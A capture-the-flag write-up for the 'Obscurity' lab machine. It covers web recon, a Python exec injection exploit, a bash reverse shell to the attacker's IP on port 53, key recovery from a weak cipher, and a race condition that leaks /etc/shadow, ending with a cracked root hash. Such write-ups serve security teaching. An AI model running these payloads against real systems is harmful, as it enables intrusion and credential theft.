# Obscurity

## Preparation

Added IP to /etc/hosts as "obscure.htb"

## Recon

Starting with nmap
```
nmap -v -r -sV -sC obscure.htb 
```

### HTTP (TCP/8080)

BadHTTPServer

Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory

Used wfuzz to find the "secret development directory" - develop
	wfuzz -u http://obscure.htb:8080/FUZZ/SuperSecureServer.py -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404

As hinted at by the comments in the code, there is a vulnerability in how it parses input
	exec(info.format(path)) # This is how you do string formatting, right?

The exec function will run python code and the os module is imported so that means we should have code execution.

## Cracking the Perimeter

Exploit PoC Code

```
#!/usr/bin/python3

import requests

url = "http://obscure.htb:8080/"
payload = "';os.system('sleep 10');'"

url = url + payload

r = requests.get(url)
```

Generating reverse shell code in Bash using shellclip. Since initial recon showed signs of a firewall, I'll use TCP/53 to bypass it.

```
bash -i >& /dev/tcp/10.10.14.160/53 0>&1
```

After some tweaking of the syntax, I got a shell as 

```
#!/usr/bin/python3

import requests

url = "http://obscure.htb:8080/"
payload = "';os.system('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.160/53 0>&1\"'"");'"

url = url + payload

r = requests.get(url)
```

## Privilege Escalation

In /home/robert/ there is a custom encryption mechanism with the input and encrypted output of a particular string. "Encrypting this file with your key should result in out.txt, make sure your key is correct!". The following code is used to encrypt it.

```
def encrypt(text, key):
	keylen = len(key)
	keyPos = 0
	encrypted = ""
	for x in text:
		keyChr = key[keyPos]
		newChr = ord(x)
		newChr = chr((newChr + ord(keyChr)) % 255)
		encrypted += newChr
		keyPos += 1
		keyPos = keyPos % keylen
	return encrypted
```

Since it adds the key to the plaintext to make the ciphertext for each position, you can subtract the plaintext from the ciphertext in each position to derive the key.

```
#!/usr/bin/python3

def getKey(cipher, plain):
	position = 0
	key = ""
	for item in list(plain):
		cipherchar = cipher[position]
		plainchar = ord(item)
		key += chr((ord(cipherchar) - plainchar))
		position +=1
	print(key)

with open('/home/robert/out.txt') as f:
	cipher = f.read()

with open('/home/robert/check.txt') as f:
	plain = f.read()

getKey(cipher, plain)
``` 

"alexandrovichal" is the key
	cd /home/robert; python3 SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovichal -o /dev/shm/
	
Output is "SecThruObsFTW" - local passowrd - flag is in /home/robert/user.txt

I can run /home/robert/BetterSSH.py as sudo

It makes a copy of the shadow file in /tmp and looks like it does not delete it if you successfully authenticate

```
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')

```

It does not make the directory...
```
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Traceback (most recent call last):
  File "/home/robert/BetterSSH/BetterSSH.py", line 24, in <module>
    with open('/tmp/SSH/'+path, 'w') as f:
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/SSH/Qq5WcHjG'

```

I had to make the /tmp/SSH/ directory

It does remove the copy of the shadow file in either case, what if I can get a second shell to inspect the directory while "logging in"?

Uploaded and executed linper for TCP/5253

Doesn't work, wrong version of netcat

Tweaked linper to use python3 in all cases and got a second shell as robert

Retrieved the shadow file by running...
```
find . -type f -exec cat {} +
```
...in one terminal and running...
```
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
...in another and supplying robert and SecThruObsFTW as the username and password

Hashcat recovered one password pretty quickly
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:mercedes

That is the root password!